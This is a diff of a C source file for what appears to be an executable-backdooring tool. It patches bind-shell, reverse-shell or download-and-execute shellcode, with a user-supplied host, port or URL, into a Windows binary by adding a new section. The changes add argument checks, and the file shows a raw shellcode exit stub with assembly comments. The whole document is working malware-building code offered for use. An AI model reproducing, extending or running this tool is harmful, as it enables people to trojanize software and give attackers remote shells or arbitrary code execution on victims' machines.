@@ -159,11 +159,10 @@ void *memmem(char *haystack, unsigned int haystack_len, char *needle, unsigned i
 		if((memcmp(haystack+i,needle,needle_len)==0))
 		{
 			memcpy(p_offset, &i, 4);
-			//p_offset = (DWORD *)&i;
 			break;
 		}
 	}
-//	return TRUE;
+
 
 }
 
@@ -189,8 +188,15 @@ int main(int argc, char *argv[])
 	BOOL bind = FALSE;
 	BOOL reverse = FALSE;
 	BOOL dwnexec = FALSE;
-//char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //NOP SLED
-//"\x60";	//PUSHAD
+	BOOL s = FALSE;
+	BOOL k = FALSE;
+	BOOL u = FALSE;
+	BOOL ifile = FALSE;
+	BOOL o = FALSE;
+	BOOL v = FALSE;
+	BOOL f = FALSE;
+	BOOL h = FALSE;
+	BOOL p = FALSE;	
 
 char exit_stub[] = "\x31\xc0\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x0c\x8b\x40\x18\x05\xff\xee\xdd\xcc\x90\x90\x89\x44\xE4\x1c\x90\x61\x90\x90\x90\x90\xff\xe0";// "\x90\x90" = "\x89\xec" | "\x90" = "\x5D" | "\x9d" popfd removed since it some times insert brakpoint and break execution
 /*
@@ -213,12 +219,11 @@ pop ebp				; poping back ebp addr	//NOP
 popad				; pop registers
 jmp eax				; jmp to addr saved in eax
 */
-
 for (count = 0; count < argc; count++)
 {
-
 	if (!strcmp(argv[count],"-k"))
 	{
+		k = TRUE;
 		if (!strcmp(argv[count+1], "bind"))
 		{
 			shellcode=(CHAR *)calloc(sizeof(bind_shell_threaded_patched),1);
@@ -244,6 +249,7 @@ for (count = 0; count < argc; count++)
 	}
 	if (!strcmp(argv[count],"-s"))
 	{
+		s = TRUE;
 		if (!strcmp(argv[count+1], "bind"))
 		{
 			shellcode=(CHAR *)calloc(sizeof(bind_shell),1);
@@ -268,61 +274,128 @@ for (count = 0; count < argc; count++)
 	}
 	if (!strcmp(argv[count],"-o"))
 	{
+		o = TRUE;
 		outputfile=(char *)calloc(strlen(argv[count+1]),1);
 		strcpy(outputfile,argv[count+1]);
 	}
 	if (!strcmp(argv[count],"-i"))
 	{
+		ifile = TRUE;
 		inputfile=(char *)calloc(strlen(argv[count+1]),1);
 		strcpy(inputfile,argv[count+1]);
 	}
 	if(!strcmp(argv[count],"-p"))
 	{
+		p = TRUE;
 		port = htons(atoi(argv[count+1]));
 	}
 	if(!strcmp(argv[count],"-h"))
 	{
+		h = TRUE;
 		ip = inet_addr(argv[count+1]);
 	}
 	if(!strcmp(argv[count],"-u"))
 	{
+		u  = TRUE;
 		url = (CHAR *)calloc(strlen(argv[count+1]+1),1);
 		strcpy(url,argv[count+1]);
 	}
 	if(!strcmp(argv[count],"-f"))
 	{
+		f = TRUE;
 		uri = (CHAR *)calloc(strlen(argv[count+1]+1),1);
 		strcpy(uri,argv[count+1]);
 	}
 	if(!strcmp(argv[count],"-of"))
 	{
+		v = TRUE;
 		of = (CHAR *)calloc(strlen(argv[count+1])+1,1);
 		strcpy(of,argv[count+1]);
 	}
 }
+if (k == TRUE && s == TRUE)
+{
+	printf("[*] Please choose one type of shellcode\n");
+	return -1;
+}
+if (k == FALSE && s == FALSE)
+{
+	printf("[*] Please choose shellcode type\n");
+	return -1;
+}
+if (bind == FALSE && reverse == FALSE && dwnexec == FALSE)
+{
+	printf("[*] PLease choose payload type\n");
+	return -1;
+}
+if (ifile == FALSE || o == FALSE)
+{
+	printf("[*] please Enter input and output file\n");
+	return -1;
+}
 if (bind == TRUE)
 {
-// Shellcode Patching PORT
-	memmem(shellcode,shellcode_size,patch_port,sizeof(WORD),&patch_offset);
-	memcpy(shellcode+patch_offset,&port,sizeof(port));
+	if (p == FALSE)
+	{
+		printf("[*] Please Enter port number\n");
+		return -1;
+	}
+	else if (h == TRUE || v == TRUE || u == TRUE || f == TRUE)
+	{
+		printf("[*] Bind Shell only takes port as an argument\n");
+		return -1;
+	}
+	else
+	{		
+	// Shellcode Patching PORT
+		memmem(shellcode,shellcode_size,patch_port,sizeof(WORD),&patch_offset);
+		memcpy(shellcode+patch_offset,&port,sizeof(port));
+	}
 }
 if (reverse == TRUE)
 {
-// Shellcode Patching PORT
-	memmem(shellcode,shellcode_size,patch_port,sizeof(WORD),&patch_offset);
-	memcpy(shellcode+patch_offset,&port,sizeof(port));
-// Reverse Shellcode Patching HOST
-	memmem(shellcode,shellcode_size,patch_ip,sizeof(DWORD),&patch_offset);
-	memcpy(shellcode+patch_offset,&ip,sizeof(ip));
+	if (p == FALSE || h == FALSE)
+	{
+		printf("[*] Please enter host, and port to connect back to\n");
+		return -1;
+	}
+	else if ( v == TRUE || u == TRUE || f == TRUE)
+	{
+		printf("[*] Reverse Shell only requires host and port\n");
+		return -1;
+	}
+	else
+	{
+	// Shellcode Patching PORT
+		memmem(shellcode,shellcode_size,patch_port,sizeof(WORD),&patch_offset);
+		memcpy(shellcode+patch_offset,&port,sizeof(port));
+	// Reverse Shellcode Patching HOST
+		memmem(shellcode,shellcode_size,patch_ip,sizeof(DWORD),&patch_offset);
+		memcpy(shellcode+patch_offset,&ip,sizeof(ip));
+	}
 }
 if (dwnexec == TRUE)
 {
-	memmem(shellcode,shellcode_size,patch_URL,sizeof(patch_URL)-1,&patch_offset);
-	memcpy(shellcode+patch_offset,url,strlen(url)+1);
-	memmem(shellcode,shellcode_size,patch_URI,sizeof(patch_URI)-1,&patch_offset);
-	memcpy(shellcode+patch_offset,uri,strlen(uri)+1);
-	memmem(shellcode,shellcode_size,patch_output,sizeof(patch_output)-1,&patch_offset);
-	memcpy(shellcode+patch_offset,of,strlen(of)+1);
+	if ( v == FALSE || u == FALSE || f == FALSE)
+	{
+		printf("[*] Download & execute takes three arguments\n");
+		return -1;
+	}
+	else if ( p == TRUE || h == TRUE)
+	{
+		printf("[*] Download & Execute Needs only URL, URI, output file\n");
+		return -1;
+	}
+	else
+	{
+	// URL, URI, shellcode OUTPUT file download & execute patching
+		memmem(shellcode,shellcode_size,patch_URL,sizeof(patch_URL)-1,&patch_offset);
+		memcpy(shellcode+patch_offset,url,strlen(url)+1);
+		memmem(shellcode,shellcode_size,patch_URI,sizeof(patch_URI)-1,&patch_offset);
+		memcpy(shellcode+patch_offset,uri,strlen(uri)+1);
+		memmem(shellcode,shellcode_size,patch_output,sizeof(patch_output)-1,&patch_offset);
+		memcpy(shellcode+patch_offset,of,strlen(of)+1);
+	}
 }
 
 	new_ish = (IMAGE_SECTION_HEADER *)calloc(sizeof(IMAGE_SECTION_HEADER),1);
